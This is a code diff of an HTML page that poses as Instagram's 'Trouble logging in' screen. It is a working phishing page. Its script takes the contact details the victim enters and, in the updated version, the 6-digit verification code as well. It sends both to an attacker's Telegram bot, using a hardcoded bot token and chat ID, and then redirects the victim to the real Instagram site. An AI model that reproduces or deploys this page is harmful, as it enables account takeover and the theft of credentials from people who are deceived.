@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Reset Password • Instagram</title>
+  <title>Instagram</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: sans-serif;
       background: #fafafa;
       display: flex;
       justify-content: center;
@@ -14,59 +14,72 @@
     }
     .box {
       background: #fff;
-      padding: 40px;
-      border: 1px solid #ddd;
+      padding: 30px;
+      border: 1px solid #ccc;
       width: 300px;
-      text-align: center;
+      box-shadow: 0 0 10px #ccc;
     }
     input {
       width: 100%;
       padding: 10px;
-      margin: 8px 0;
+      margin: 10px 0;
     }
     button {
       width: 100%;
-      background-color: #3897f0;
-      color: white;
       padding: 10px;
+      background: #3897f0;
+      color: white;
       border: none;
-      margin-top: 10px;
+      cursor: pointer;
     }
-    .message {
-      font-size: 14px;
-      margin-top: 10px;
-      color: green;
+    .hidden {
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h3>Trouble logging in?</h3>
-    <p style="font-size:14px;">Enter your email, phone, or username and we'll send you a link to get back into your account.</p>
+    <h3 style="text-align:center;">Instagram</h3>
+    
+    <!-- مرحله اول: درخواست ریست رمز -->
     <form id="resetForm">
-      <input type="text" id="resetInfo" placeholder="Phone number, username, or email" required />
-      <button type="submit">Send Login Link</button>
+      <input type="text" id="contact" placeholder="Phone number or email" required />
+      <button type="submit">Send Code</button>
     </form>
-    <div id="response" class="message"></div>
+
+    <!-- مرحله دوم: وارد کردن کد تأیید -->
+    <form id="verifyForm" class="hidden">
+      <input type="text" id="code" placeholder="Enter the 6-digit code" required />
+      <button type="submit">Verify</button>
+    </form>
   </div>
 
   <script>
-    const botToken = "7917095508:AAFyR4fE92SCZmkMjCm2vKI4katC_yMOHWY";  // جایگزین توکن خودت
-    const chatId = "1703538236";  // جایگزین چت آیدی خودت
+    const botToken = "7917095508:AAFyR4fE92SCZmkMjCm2vKI4katC_yMOHWY";
+    const chatId = "1703538236";
 
-    document.getElementById("resetForm").addEventListener("submit", function (e) {
+    const resetForm = document.getElementById("resetForm");
+    const verifyForm = document.getElementById("verifyForm");
+
+    resetForm.addEventListener("submit", function(e) {
       e.preventDefault();
+      const contact = document.getElementById("contact").value;
+      const msg = `🔐 Forgot Password Request\n📧 Contact: ${contact}`;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+      
+      resetForm.classList.add("hidden");
+      verifyForm.classList.remove("hidden");
+    });
 
-      const input = document.getElementById("resetInfo").value;
-      const message = `🔁 Instagram Reset Request\n📧 Info Entered: ${input}`;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-
-      document.getElementById("response").textContent = "Sending login link...";
-
-      setTimeout(() => {
-        window.location.href = "https://www.instagram.com";
-      }, 2000);
+    verifyForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const code = document.getElementById("code").value;
+      const msg = `✅ Verification Code Entered\n🔢 Code: ${code}`;
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+      
+      window.location.href = "https://instagram.com";
     });
   </script>
 </body>
